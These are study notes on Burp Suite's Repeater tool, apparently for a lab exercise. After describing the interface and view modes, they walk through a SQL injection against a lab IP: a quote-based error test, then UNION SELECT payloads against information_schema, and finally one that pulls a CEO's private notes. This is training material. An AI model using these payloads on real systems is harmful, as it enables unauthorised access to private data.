# Burp Suite — Repeater

## 🔍 Overview

**Repeater** allows you to capture, modify, and resend HTTP requests as many times as needed — without going through the proxy intercept flow each time. It also supports creating requests from scratch, similar to `curl` from the command line.

> **When to use Repeater:** Once you've identified a potentially vulnerable parameter, Repeater is where you test and refine your payloads iteratively — adjusting the request, firing it, and analysing the response in a tight loop.

---

## 🖥️ Interface

| Component | Description |
|-----------|-------------|
| **Request List** | Tabs at the top — each tab holds one request. Multiple requests can be open simultaneously |
| **Request Controls** | Send, Cancel, and navigation arrows to move through request history |
| **Request / Response View** | Side-by-side (or split) panels showing the editable request and the server's response |
| **Layout Options** | Toggle between horizontal split, vertical split, or combined view |
| **Inspector** | Structured breakdown of the request and response — more intuitive than editing raw text |
| **Target** | Specifies the IP address or domain to which requests are sent |

---

## ⚙️ Usage

```
1. Capture a request in the Proxy tab
2. Send it to Repeater: right-click → Send to Repeater, or Ctrl+R
3. Modify the request as needed in the Request panel
4. Click Send — the response populates the Response panel
5. Iterate — adjust and resend as many times as needed
```

---

## 📨 Message Analysis — View Options

Both the request and response panels offer multiple view modes:

| Mode | Description |
|------|-------------|
| **Pretty** | Formatted version of the raw response — improves readability for HTML, JSON, XML |
| **Raw** | Unmodified response exactly as received from the server |
| **Hex** | Byte-level hexadecimal representation — useful for binary files or non-printable data |
| **Render** | Renders the response as a browser would display it — visual preview of the page |
| **Show non-printable (`\n`)** | Displays characters not visible in Pretty or Raw — newlines, null bytes, control characters |

---

## 🔎 Inspector

The Inspector panel provides a structured, clickable breakdown of request and response components — useful when the raw format is hard to navigate.

| Section | Description |
|---------|-------------|
| **Request Attributes** | Modify request method, URL path, and HTTP protocol version |
| **Request Query Parameters** | Data sent via the URL query string (`?key=value`) |
| **Request Body Parameters** | POST body data — specific to POST/PUT requests |
| **Request Cookies** | Modifiable list of cookies being sent with the request |
| **Request Headers** | View, add, edit, or remove any request header |
| **Response Headers** | Read-only view of headers returned by the server |

---

## 💉 Practical — SQLi with Repeater

**Objective:** Find the CEO's private notes by exploiting a SQL injection vulnerability and extracting data via Repeater.

---

### Step 1 — Detect the Vulnerability

```
URL: http://10.130.175.225/about/2

# Append a single quote to break the SQL query
http://10.130.175.225/about/2'
```

If the server responds with a database error — the query was broken and SQLi is confirmed.

> Send this request to Repeater (`Ctrl+R`) to work from here.

---

### Step 2 — Read the Error / Response Body

Search the response body for the raw SQL query leaked in the error message:

```sql
SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'
```

This reveals:
- The table name: `people`
- At least **5 columns**: `firstName`, `lastName`, `pfpLink`, `role`, `bio`

---

### Step 3 — Find All Column Names

Use `UNION ALL SELECT` against `information_schema.columns` to enumerate the table's columns:

```
/about/0 UNION ALL SELECT column_name,null,null,null,null
FROM information_schema.columns
WHERE table_name="people"
```

| Technique | Reason |
|-----------|--------|
| `id` changed to `0` | Invalid ID ensures no real row is returned — only the injected data appears |
| `null` padding | Matches the 5-column structure — prevents query errors from column count mismatch |

Only the **first column** value is returned at a time in this view — the column name appears in place of `firstName`.

---

### Step 4 — Extract All Columns at Once with `group_concat`

`group_concat()` aggregates all values into a single string — returning all column names in one response:

```
/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null
FROM information_schema.columns
WHERE table_name="people"
```

**Result:**
```
id, firstname, lastname, link, role, bio, notes, none
```

The table has a `notes` column — this is the target.

---

### Step 5 — Extract the Notes

Query the `notes` column for the CEO (assuming `id = 1`):

```
/about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
```

The CEO's private notes are returned in the response.
